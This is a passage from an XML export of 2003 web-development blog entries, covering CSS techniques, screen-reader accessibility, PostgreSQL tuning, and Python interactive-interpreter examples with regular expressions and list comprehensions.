		<field name="title">&quot;Is Evil..&quot; titles are evil</field>
		<field name="slug">isEvil</field>
		<field name="body">&lt;p&gt;Too excellent articles on Object Oriented Design: &lt;a href=&quot;http://www.javaworld.com/javaworld/jw-08-2003/jw-0801-toolbox.html&quot;&gt;Why extends is evil&lt;/a&gt; and &lt;a href=&quot;http://www.javaworld.com/javaworld/jw-09-2003/jw-0905-toolbox.html&quot;&gt;Why getter and setter methods are evil&lt;/a&gt;. Ignore the inflammatory titles: the subheading of the second article, &quot;Make your code more maintainable by avoiding accessors&quot;, is a much better indication of their content. I picked up some great tips on proper use of &lt;acronym title=&quot;Object Oriented Programming&quot;&gt;OOP&lt;/acronym&gt; from reading them. In particular, the &lt;a href=&quot;http://www.javaworld.com/javaworld/jw-09-2003/jw-0905-toolbox-p3.html&quot;&gt;section on CRC cards&lt;/a&gt; made something click which hadn't clicked when I looked at them earlier this year for my ill fated University software project.&lt;/p&gt;</field>
		<field name="created">2003-09-08 20:44:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1176</field>
		<field name="title">Andy in the Garden</field>
		<field name="slug">andyInTheGarden</field>
		<field name="body">&lt;p&gt;My friend Andy's design skills &lt;a href=&quot;http://blog.mooncalf.me.uk/archive/2003/09/09#SecretsRevealed&quot; title=&quot;Secrets Revealed&quot;&gt;have been recognised&lt;/a&gt; by &lt;a href=&quot;http://www.csszengarden.com/?cssfile=042%2F042%2Ecss&quot;&gt;the CSS Zen Garden&lt;/a&gt;. Congratulations! He's number &lt;a href=&quot;http://www.google.com/search?q=answer+to+life+the+universe+and+everything&quot;&gt;42&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-09-09 10:15:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1177</field>
		<field name="title">Javascript free rollovers</field>
		<field name="slug">jsFreeRollovers</field>
		<field name="body">&lt;p&gt;I've talked about image &lt;a href=&quot;http://simon.incutio.com/search?q=rollovers&quot; title=&quot;Search result: rollovers&quot;&gt;rollovers&lt;/a&gt; on this site before, but I've never seen a technique I like half as much as Pixy's &lt;a href=&quot;http://www.pixy.cz/blogg/clanky/cssnopreloadrollovers/&quot;&gt;Fast rollovers, no preload needed&lt;/a&gt;. Like all good techniques, it's so simple I'm surprised no one has thought of it before. The trick is that a single image is loaded containing the different rollover states, then positioned as the background of a fixed pixel size link element in such a way that only one of the states is shown. The :hover style simply changes the offset of the background, revealing the secondary (or even tertiary) state.&lt;/p&gt;</field>
		<field name="created">2003-09-10 17:58:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1178</field>
		<field name="title">PostgreSQL Performance Optimisation</field>
		<field name="slug">pgPerformance</field>
		<field name="body">&lt;p&gt;Via the &lt;a href=&quot;http://archives.postgresql.org/pgsql-performance/2003-09/msg00186.php&quot; title=&quot;Re: Reading data in bulk - help?&quot;&gt;pgsql-performance mailing list&lt;/a&gt;, a great guide to &lt;a href=&quot;http://www.varlena.com/varlena/GeneralBits/Tidbits/perf.html&quot;&gt;Tuning PostgreSQL for performance&lt;/a&gt;, accompanied by a huge table of &lt;a href=&quot;http://www.varlena.com/varlena/GeneralBits/Tidbits/annotated_conf_e.html&quot; title=&quot;Annotated postgresql.conf and Global User Configuration (GUC) Guide&quot;&gt;annotated configuration options&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-09-11 11:14:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1179</field>
		<field name="title">Jump!</field>
		<field name="slug">retro</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.powerstrike.net/Tehkan/mamejump.html&quot;&gt;Retro games, 80s music&lt;/a&gt;. Awesome. Via &lt;a href=&quot;http://www.ntk.net/2003/09/05/#MEMEPOOL&quot; title=&quot;Need To Know 2003-09-05&quot;&gt;NTK&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-09-12 14:28:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1180</field>
		<field name="title">Prior Art</field>
		<field name="slug">priorArt</field>
		<field name="body">&lt;p&gt;The most interesting thing to come out of this whole &lt;a href=&quot;http://news.com.com/2100-1012_3-5069943.html&quot;&gt;Eolas disaster&lt;/a&gt; could well turn out to be Ray Ozzie's &lt;a href=&quot;http://www.ozzie.net/blog/stories/2003/09/12/savingTheBrowser.html&quot; title=&quot;Saving the Browser&quot;&gt;description&lt;/a&gt; of how Lotus Notes was demonstrating many of the funamental abilities of today's browsers, including dynamic application embedding remarkably similar to that covered back in the patent, way back in 1993. The patent was filed in 1994. Prior art? We can only hope.&lt;/p&gt;</field>
		<field name="created">2003-09-13 10:52:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1181</field>
		<field name="title">Screen readers and display: none</field>
		<field name="slug">screenReaders</field>
		<field name="body">&lt;p&gt;I've long heard rumours that some screen readers fail to read out text hidden using the &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; &lt;code class=&quot;css&quot;&gt;display: none&lt;/code&gt; property, but I had never really investigated it as I don't have access to a screen reader myself (I should really download the &lt;a href=&quot;http://www.freedomscientific.com/fs_downloads/jaws.asp&quot;&gt;JAWS trial&lt;/a&gt; some day). Bob Easton's &lt;a href=&quot;http://eleaston.com/bob/screenreader-visibility.html&quot;&gt;What do screen readers really say?&lt;/a&gt; describes the problem and specifies a number of tests for screen reader abilities, the results of which are collated on &lt;a href=&quot;http://css-discuss.incutio.com/?page=ScreenreaderVisibility&quot; title=&quot;ScreenreaderVisibility&quot;&gt;this Wiki page&lt;/a&gt;. As a side note, quickly collecting the results of this kind of test is an excellent way to make use of a Wiki.&lt;/p&gt;

&lt;p&gt;The results confirm the initial concern: All three leading screen readers (JAWS, Window Eyes and IBM Home Page Reader) fail to read out text that is hidden using either &lt;code class=&quot;css&quot;&gt;display: none&lt;/code&gt; or &lt;code class=&quot;css&quot;&gt;visibility: hidden&lt;/code&gt;, even when those styles are served up as part of a stylesheet targetted for visual (screen) media. This is yet another example of vendors ignoring valuable parts of the CSS specification, but until screen readers become more intelligent we're going to have to live with it.&lt;/p&gt;

&lt;p&gt;Luckily, a solution is at hand. Jon Hicks &lt;a href=&quot;http://exp.hicksdesign.co.uk/archives/000147.php&quot; title=&quot;skip navigation solutions&quot;&gt;demonstrates&lt;/a&gt; that the following 4 lines of &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; can hide elements from visual browsers while leaving them available to screen readers:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;css&quot;&gt;.skip {
  height: 0;
  width: 0;
  overflow: hidden;
  position: absolute; /* for the benefit of IE5 Mac */
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;An even neater variant is &lt;a href=&quot;http://blog.tom.me.uk/2003/09/13/skipadeedoodah.php&quot; title=&quot;Skip-a-dee-doo-dah&quot;&gt;provided by Tom Gilder&lt;/a&gt; on his blog, where the :active and :focus pseudo selectors are used to provide a skip navigation link that remains invisible until focussed on using the tab key on the keyboard. This technique really does provide the best of both worlds; the skip link is invisible in the standard design, but still shows up for keyboard navigation users who may find it useful. I've implemented Tom's technique in my stylesheet for this site.&lt;/p&gt;</field>
		<field name="created">2003-09-13 11:22:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1182</field>
		<field name="title">Listutorial</field>
		<field name="slug">listutorial</field>
		<field name="body">&lt;p&gt;Russ Weakley has followed up his excellent &lt;a href=&quot;http://www.maxdesign.com.au/presentation/listamatic/index.htm&quot;&gt;Listamatic&lt;/a&gt; with a useful set of &lt;a href=&quot;http://www.maxdesign.com.au/presentation/listutorial/index.htm&quot; title=&quot;Listutorial&quot;&gt;tutorials&lt;/a&gt; on styling lists. The style of the tutorial looks worth emulating: each page adds a new property, explaining what it does and showing how it affects the list. I particularly liked the &lt;a href=&quot;http://www.maxdesign.com.au/presentation/listutorial/11.htm&quot;&gt;Icon lists&lt;/a&gt; demonstration.&lt;/p&gt;</field>
		<field name="created">2003-09-13 11:48:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1183</field>
		<field name="title">Python for teaching mathematics</field>
		<field name="slug">pythonMaths</field>
		<field name="body">&lt;p&gt;Kirby Urner provides some &lt;a href=&quot;http://wingide.com/pipermail/marketing-python/2003-September/005211.html&quot; title=&quot;[marketing-python] Re: How popular is Python? What sort of things can we measure?&quot;&gt;great examples&lt;/a&gt; of how Python can be used as an aid to understanding mathematics on the marketing-python mailing list. I particularly liked this demonstration of Pascal's triangle using Python generators:&lt;/p&gt;

&lt;blockquote cite=&quot;http://wingide.com/pipermail/marketing-python/2003-September/005211.html&quot;&gt;&lt;pre&gt;
 &amp;gt;&amp;gt;&amp;gt; def pascal():
         row = [1]
         while True:
            yield row
            row = [i+j for (i,j) in zip([0] + row, row + [0])]


  &amp;gt;&amp;gt;&amp;gt; gen = pascal()
  &amp;gt;&amp;gt;&amp;gt; for i in range(10):
            print gen.next()


  [1]
  [1, 1]
  [1, 2, 1]
  [1, 3, 3, 1]
  [1, 4, 6, 4, 1]
  [1, 5, 10, 10, 5, 1]
  [1, 6, 15, 20, 15, 6, 1]
  [1, 7, 21, 35, 35, 21, 7, 1]
  [1, 8, 28, 56, 70, 56, 28, 8, 1]
  [1, 9, 36, 84, 126, 126, 84, 36, 9, 1]
&lt;/pre&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-09-13 12:00:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1184</field>
		<field name="title">Curious emails</field>
		<field name="slug">sillySeason</field>
		<field name="body">&lt;p&gt;There follow two of the weirdest emails I have ever received through my &lt;a href=&quot;/contact/&quot;&gt;contact form&lt;/a&gt;. The first is a fascinating rant against standards compliant client side scripting:&lt;/p&gt;

&lt;blockquote&gt;
&lt;h4&gt;don't use javascript don't use netscape&lt;/h4&gt;

&lt;p&gt;Respectfully taking a leaf from you I would most strongly urge you to cease using JavaScript and instead use the much better script language, Microsoft's VBScript.&lt;/p&gt;

&lt;p&gt;In the smae vein, I beg of you to use the DOM.all of IE exclusively and turn your back on Netscape and its clones.&lt;/p&gt;

&lt;p&gt;I feel very strongly about this.  JavaScript's syntax ism abominable...too many curly braces, semi-colons, square brackets, regular parentheses and all the claptrap symbols it borrowed from that abominable language - C - and its successor - C++ -. The hours I spent hunting for the missing semi-colon or the improperly inserted double colon and wading thru the false error messages of Borland's C v.2.  It was a horriblem experience.  I need you to give me your unstinted and selfless support to kill off, once and for all, that abomination called JavaScript.  This is a call for sanity in scripting.  Let's bring back simplicity, lets get rid of unnecessary complexity.  Help ME!!!&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;The second is just plain odd. I can only guess it has something to do with &lt;a href=&quot;http://simon.incutio.com/archive/2003/02/07/realGirlsEatBeef&quot; title=&quot;Real girls eat beef&quot;&gt;this entry&lt;/a&gt;.&lt;/p&gt;

&lt;blockquote&gt;
&lt;h4&gt;Grassfed beef&lt;/h4&gt;

&lt;p&gt;Eat grassfed beef...now its the real McCoy...full-flavored beef that is heart healthy and rich in Omega-3 and CLA.  Try GrasslandBeef.com&lt;/p&gt;

&lt;p&gt;Grain fed beef is not heart healthy...and I used to eat it all the time and really gained weight and increased my cholesterol...and now that I have found grass fed beef, it is going down and I actually prefer the taste of bland grain fed products.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-09-14 13:20:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1185</field>
		<field name="title">New content management blog</field>
		<field name="slug">newBlog</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.nmpub.com/blog/&quot;&gt;Ideas in Technology and Publishing&lt;/a&gt; is a great new blog covering content management, &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; and other publishing related technologies. It's less than a month old so it's still possible to read through the archives in full, which I've just done and recommend to anyone with an interest in content management.&lt;/p&gt;</field>
		<field name="created">2003-09-15 11:06:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1186</field>
		<field name="title">Don't delete.me</field>
		<field name="slug">dontDeleteMe</field>
		<field name="body">&lt;p&gt;Paul Sowden is the blogger who inspired me to start my own blog over a year ago. He's restarted his blog at a new domain: &lt;a href=&quot;http://delete.me.uk/&quot;&gt;delete.me.uk&lt;/a&gt;. Let's hope the new site doesn't &lt;a href=&quot;http://delete.me.uk/2003/08/22/firstpost&quot; title=&quot;Paul has a habit of deleting everything after a few months&quot;&gt;live up to its name&lt;/a&gt;. Oh, and be sure to view source for Paul's own special brand of minimalist valid &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; 4.&lt;/p&gt;</field>
		<field name="created">2003-09-15 11:12:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1187</field>
		<field name="title">Interactive Python</field>
		<field name="slug">interactivePython</field>
		<field name="body">&lt;p&gt;I adore the Python interactive interpreter. I use it for development (it's amazing how many bugs you can skip by testing your code line by line in the interactive environment), I use it for calculations, but recently I've also found myself using it just as a general tool for answering questions.&lt;/p&gt;

&lt;p&gt;Here's a classic example. &lt;a href=&quot;http://funkbunny.com/datatype/archives/000076.html&quot; title=&quot;The RIAA Are Dicks. We Apologize.&quot;&gt;This blog entry&lt;/a&gt; describes a campaign to reimbuse the 12 year old girl recently &lt;a href=&quot;http://news.com.com/2100-1027_3-5073717.html&quot; title=&quot;RIAA settles with 12-year-old girl&quot;&gt;fined $2000&lt;/a&gt; by the &lt;acronym title=&quot;Recording Industry Association of America&quot;&gt;RIAA&lt;/acronym&gt; for file sharing. The full amount has been raised, and a list of doners is available along with how much each donated. Being the inquisitive type I am, I wanted to know how much money was raised in total. First, I copied and pasted the list in to a Python string in IDLE:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; s = &quot;&quot;&quot;$20 - Emmett Plant, USA
$20 - Peter Mills, UK
$20 - &quot;Billy Blackbeard,&quot; USA
...
$10 - Will Morton&quot;&quot;&quot;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All of the monetary values consist of 2 digits, so next I compiled and tested a regular expression to search for them:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import re
&amp;gt;&amp;gt;&amp;gt; num = re.compile(r'\d\d')
&amp;gt;&amp;gt;&amp;gt; num.findall(s)
['20', '20', '20', '20', '20', '20', '20', ...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I can run the &lt;code class=&quot;python&quot;&gt;sum()&lt;/code&gt; function to add them all up:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; sum(num.findall(s))

Traceback (most recent call last):
  File &quot;&amp;lt;pyshell#4&amp;gt;&quot;, line 1, in -toplevel-
    sum(num.findall(s))
TypeError: unsupported operand type(s) for +: 'int' and 'str'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oops! &lt;code class=&quot;python&quot;&gt;sum&lt;/code&gt; operates on integers but the list is full of strings. We can use &lt;code class=&quot;python&quot;&gt;map&lt;/code&gt; to apply the &lt;code class=&quot;python&quot;&gt;int&lt;/code&gt; function to every item in the list first:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; sum(map(int, num.findall(s)))
2005
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And there's the answer. I think this quite neatly demonstrates the power and flexibility of the interactive prompt - for one thing, it shows that errors really don't matter as you can simply try again the next time round. It also shows that most of the time you don't even need to assign additional variables - Python is fast enough that you can just build up more and more complicated expressions. When you're just trying to find a one off answer to a problem code readability doesn't really come in to the equation.&lt;/p&gt;

&lt;p&gt;A more interesting problem that came up today was working out the percentage of Netscape 4 visits to the &lt;a href=&quot;http://www.python.org/&quot;&gt;Python.org&lt;/a&gt; site in the last month, as part of a mailing list discussion on whether or not the site should embrace a pure &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; layout. The raw data is a &lt;a href=&quot;http://www.python.org/wwwstats/agent_200308.html&quot; title=&quot;Usage Statistics for www.python.org: August 2003 - User Agent&quot;&gt;huge, ugly file&lt;/a&gt; listing 12,000 odd user agent strings along with the number of hits from each. My first step was to copy out the data part of the file and save it as a text file. I also compiled a new regular expression to find all lines that &lt;em&gt;start&lt;/em&gt; with a number, which could then be used to ensure the data loaded was in the right format.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; num = re.compile(r'^(\d+)')
&amp;gt;&amp;gt;&amp;gt; lines = open('python-browser-stats.txt').readlines() 
&amp;gt;&amp;gt;&amp;gt; lines = [line for line in lines if num.match(line)] 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finding the lines that contained a user agent string for Netscape 4 took a bit of effort, mainly because of the utterly insane way user agent strings have evolved over the years. I eventually settled on the rule that anything with Mozilla/4.x in it &lt;em&gt;without&lt;/em&gt; the word 'compatible' was probably a Netscape 4 variant. I excluded anything with 'Gecko' in it as well, but with hindsight this was unnecessary as Gecko browsers all start with Mozilla/5.x.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; netscape = [line for line in lines if
    'Mozilla/4' in line and
    'compatible' not in line and
    'Gecko' not in line]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Are you getting the impression that I love list comprehensions yet?&lt;/p&gt;

&lt;p&gt;When working in the interactive prompt it's a good idea to periodically check that the data you are dealing with looks how you expect it to look. I've stripped down the explanation of what I did quite a bit - in fact there was a lot more checking of variables and lists to make sure nothing had gone wrong. At this point, here's what an item in my netscape array looked like:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; netscape[0]
'3536       0.05%  Mozilla/4.01 [en](Win95;I)\n'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;OK, I now had two arrays, one featuring all of the lines in the input set and another featuring just those lines that referred to a Netscape 4 browser. The final trick is to add up the total numbers for each of those sets. Remember, the total is the sum of all of the numbers at the start of each line. First, I built up new arrays of just those numbers (as integers) using the regular expression defined previously:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; nscounts = [int(num.match(line).groups()[0]) for line in netscape] 
&amp;gt;&amp;gt;&amp;gt; allcounts = [int(num.match(line).groups()[0]) for line in lines]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We now have two arrays of numbers. The total for each array can be found with the sum function, but we want the over all percentage of Netscape 4 user agents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; print float(sum(nscounts)) / sum(allcounts) * 100
1.17457446601
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The float call is in there because Python disregards the remainder in straight integer division; by casting one of the arguments to a float floating point division is used instead. As you can see, only approximately 1.17% of visits to Python.org in August were made using Netscape 4&lt;sup&gt;*&lt;/sup&gt;. The case for &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; seems assured.&lt;/p&gt;

&lt;p&gt;This has turned in to a longer entry than I had intended, but I hope it demonstrates the power and versatility of Python's interactive mode.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;sup&gt;*&lt;/sup&gt; Please note that this figure is not entirely accurate, as it may also include web spiders that pretend to be Netscape 4, Opera users and a few other false positives as well. As an estimate though it's probably pretty good.&lt;/em&gt;&lt;/p&gt;</field>
		<field name="created">2003-09-15 21:20:50</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1188</field>
		<field name="title">Google conspiracy theories</field>
		<field name="slug">googleConspiracies</field>
		<field name="body">&lt;p&gt;Microdoc News have a &lt;a href=&quot;http://microdoc-news.info/home/BloggerNews/2003/09/15.html/1&quot; title=&quot;The Bias Towards Blogs in Search Engines&quot;&gt;poorly researched story&lt;/a&gt; suggesting that Google have been engineering their search results to favour their own properties:&lt;/p&gt;

&lt;blockquote cite=&quot;http://microdoc-news.info/home/BloggerNews/2003/09/15.html/1&quot;&gt;&lt;p&gt;It could be argued that the most important site that should appear when searching for the word &lt;em&gt;blogs&lt;/em&gt; would be the generic site where anyone with a blog can get listed for her/his three minutes of fame, which includes any blog, anywhere in any system. Weblogs.com is a directory of sorts to any current post and is like, if you please, a central nervous system to the world of blogs. However, Google does not list weblogs.com as the primary site -- blogger.com is listed as the prime, first-up site in the listings that result from the blogs search. Is that because Google Inc., owns blogger.com, or is it that blogger.com is really what one would expect as the first result?&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Time to break out Python again. I won't explain the following code in detail, but essentially it downloads the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; source of the front pages of both &lt;a href=&quot;http://www.blogger.com/&quot;&gt;Blogger.com&lt;/a&gt; and &lt;a href=&quot;http://www.weblogs.com/&quot;&gt;Weblogs.com&lt;/a&gt;, strips out the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; tags (defined as anything between two angle brackets) and counts the number of occurrences of the individual word 'blogs'.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import urllib, re
&amp;gt;&amp;gt;&amp;gt; striptags = re.compile('&amp;lt;[^&amp;gt;]+&amp;gt;')
&amp;gt;&amp;gt;&amp;gt; blogs = re.compile(r'\bblogs\b', re.I)
&amp;gt;&amp;gt;&amp;gt; blogger = urllib.urlopen('http://www.blogger.com/').read()
&amp;gt;&amp;gt;&amp;gt; weblogs = urllib.urlopen('http://www.weblogs.com/').read()
&amp;gt;&amp;gt;&amp;gt; len(blogger), len(weblogs)
(26369, 394323)
&amp;gt;&amp;gt;&amp;gt; blogs.findall(striptags.sub('', blogger))
['blogs', 'blogs', 'blogs', 'Blogs']
&amp;gt;&amp;gt;&amp;gt; blogs.findall(striptags.sub('', weblogs))
['Blogs', 'Blogs', 'blogs']
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above code shows that while Blogger.com mentions the word 'blogs' four times in 26,000 characters, Weblogs.com only mentions it three times in 394,000 characters! Blogger has a far higher 'blogs' word density - in fact, the only occurrence of the word on Weblogs.com is when it happens to be a part of the name of one of the several thousand blogs listed on the page at any one time.&lt;/p&gt;

&lt;p&gt;Although word density is a reasonably useful metric for telling if Google will like something, everyone knows that Google's secret sauce is PageRank, which is based in part on the number of pages linking to a site. &lt;a href=&quot;http://www.google.com/search?q=link:www.weblogs.com&quot; title=&quot;Searched for pages linking to www.weblogs.com&quot;&gt;Two&lt;/a&gt; &lt;a href=&quot;http://www.google.com/search?q=link:www.blogger.com&quot; title=&quot;Searched for pages linking to www.blogger.com&quot;&gt;quick&lt;/a&gt; link: searches reveal 7,840 links to Weblogs.com, but a whopping 61,500 links to Blogger.com (no doubt helped by all those &quot;powered by blogger&quot; stickers).&lt;/p&gt;

&lt;p&gt;So Blogger.com not only has a higher word density for the designated search term, it also has far more links to it overall. Is it really so surprising that it's coming out on top?&lt;/p&gt;

&lt;p&gt;Further more, if you run a search for 'weblogs', Weblogs.com comes out as the &lt;a href=&quot;http://www.google.com/search?q=weblogs&quot;&gt;number one result&lt;/a&gt;. It's all in the name.&lt;/p&gt;

&lt;p&gt;Dave Winer &lt;a href=&quot;http://scriptingnews.userland.com/2003/09/16#When:2:48:50PM&quot; title=&quot;Scripting News, 16th September 2003&quot;&gt;finds it strange&lt;/a&gt; that the &lt;a href=&quot;http://google.blogspot.com/&quot;&gt;Google Weblog&lt;/a&gt; (unaffiliated with Google the company) comes out as the first result in a &lt;a href=&quot;http://www.google.com/search?q=weblog&quot;&gt;search for 'weblog'&lt;/a&gt;. My guess is that this is a result of the blog's name influencing the text of links made to it - when you link to &lt;a href=&quot;http://doc.weblogs.com/&quot;&gt;Doc Searls&lt;/a&gt; or myself (both of whom have 'weblog' in their site title) you can abbreviate it to &quot;Doc Searls&quot; or &quot;Simon Willison&quot;, but when you link to the Google Weblog you &lt;em&gt;have&lt;/em&gt; to use the fully qualified name or your link won't make sense. Google can be strongly affected by link text, as last year's &lt;a href=&quot;http://www.wordspy.com/words/Googlebombing.asp&quot; title=&quot;The Word Spy: Google bombing&quot;&gt;Google bombing&lt;/a&gt; epidemic aptly demonstrated.&lt;/p&gt;</field>
		<field name="created">2003-09-17 00:51:40</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1189</field>
		<field name="title">&quot;sexeger&quot;[::-1]</field>
		<field name="slug">sexeger</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.nedbatchelder.com/blog/200309.html#e20030916T162322&quot; title=&quot;Reversing regular expressions&quot;&gt;Ned Batchelder&lt;/a&gt;, an article on &lt;a href=&quot;http://www.perl.com/pub/a/2001/05/01/expressions.html&quot;&gt;Reversing Regular Expressions&lt;/a&gt; from Perl.com. Otherwise known as &lt;a href=&quot;http://japhy.perlmonk.org/sexeger/sexeger.html&quot; title=&quot;Sex, Eger! or Reverse Regular Expressions&quot;&gt;Sexeger&lt;/a&gt;, these offer a performance boost over normal regular expressions for certain tasks. The basic idea is pretty simple: searching &lt;em&gt;backwards&lt;/em&gt; through a string using a regular expression can be a messy business, but by reversing both the string and the expression, running it, then reversing the result far better performance can be achieved (reversing a string is a relatively inexpensive operation). The example code is in Perl, but I couldn't resist trying it in Python. The challenge is to find the &lt;em&gt;last&lt;/em&gt; number occurring in a string.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&amp;gt;&amp;gt;&amp;gt; import re
&amp;gt;&amp;gt;&amp;gt; lastnum = re.compile(r'(\d+)(?!\D*\d)')
&amp;gt;&amp;gt;&amp;gt; s = ' this isa 454 asd very very 
  very long strin9 asd9 009 76 with numbers 
  99 in it and here is the last 537 number'
  # NB this was all on one line originally
&amp;gt;&amp;gt;&amp;gt; lastnum.search(s).group(0)
'537'
&amp;gt;&amp;gt;&amp;gt; import timeit
&amp;gt;&amp;gt;&amp;gt; t1 = timeit.Timer('lastnum.search(s).group(0)', 
         'from __main__ import lastnum, s')
&amp;gt;&amp;gt;&amp;gt; print &quot;%.2f usec/pass&quot; % (1000000 * t1.timeit(number=100000)/100000)
26.82 usec/pass
&amp;gt;&amp;gt;&amp;gt; lastnumrev = re.compile('(\d+)')
&amp;gt;&amp;gt;&amp;gt; lastnumrev.search(s[::-1]).group(0)[::-1]
'537'
&amp;gt;&amp;gt;&amp;gt; t2 = timeit.Timer('lastnumrev.search(s[::-1]).group(0)[::-1]', 
         'from __main__ import lastnumrev, s')
&amp;gt;&amp;gt;&amp;gt; print &quot;%.2f usec/pass&quot; % (1000000 * t2.timeit(number=100000)/100000)
9.26 usec/pass
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are a few points worth explaining in the above code. The &lt;code class=&quot;python&quot;&gt;(?!\D*\d)&lt;/code&gt; part of the first regular expression is a &lt;em&gt;negative lookahead assertion&lt;/em&gt; - it basically means &quot;match the subpattern provided it isn't followed by a string of non-digits followed by at least one digit. This is the bit that ensures we only get back the last digit in the string, and is also the bit that could cause a performance problem.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;python&quot;&gt;'some string'[::-1]&lt;/code&gt; is an example of &lt;a href=&quot;http://www.python.org/doc/2.3/whatsnew/section-slices.html&quot;&gt;Extended Slices&lt;/a&gt;, introduced in Python 2.3. Its affect is to reverse the string, by stepping through it from start to end going back one character at a time.&lt;/p&gt;

&lt;p&gt;The actual benchmarking code makes use of the new &lt;a href=&quot;http://www.python.org/doc/2.3/lib/module-timeit.html&quot;&gt;timeit module&lt;/a&gt; from Python 2.3 - I copied it verbatim from that module's &lt;a href=&quot;http://www.python.org/doc/2.3/lib/node397.html&quot; title=&quot;10.10.2 Examples&quot;&gt;example section&lt;/a&gt; in the manual.&lt;/p&gt;

&lt;p&gt;The resutls speak for themselves: 26.82 for the lookahead assertion expression compared to just 9.26 for the reversed regular expression. This is definitely a useful trick to add to the tool box.&lt;/p&gt;</field>
		<field name="created">2003-09-17 01:53:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1190</field>
		<field name="title">Dive Into Python reborn</field>
		<field name="slug">diveIntoPython</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://diveintomark.org/archives/2003/09/17/publishing&quot; title=&quot;Dive into publishing&quot;&gt;Sweet&lt;/a&gt;. Mark Pilgrim is working on &lt;a href=&quot;http://diveintopython.org/&quot;&gt;Dive Into Python&lt;/a&gt; again, funded by a dead tree publisher for publication in 2004 (hopefully). The free version will stay available as well. I've always preferred reading paper to reading a screen so I'm definitely down for a copy.&lt;/p&gt;

&lt;p&gt;If you haven't read Dive Into Python yet, you've been sorely missing out. It's all good, but the sections I've found most useful are as follows:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;&lt;a href=&quot;http://diveintopython.org/getting_to_know_python/mapping_lists.html&quot;&gt;1.13. Mapping lists&lt;/a&gt; and &lt;a href=&quot;http://diveintopython.org/power_of_introspection/filtering_lists.html&quot;&gt;2.5. Filtering lists&lt;/a&gt; - a full explanation of list comprehensions.&lt;/li&gt;
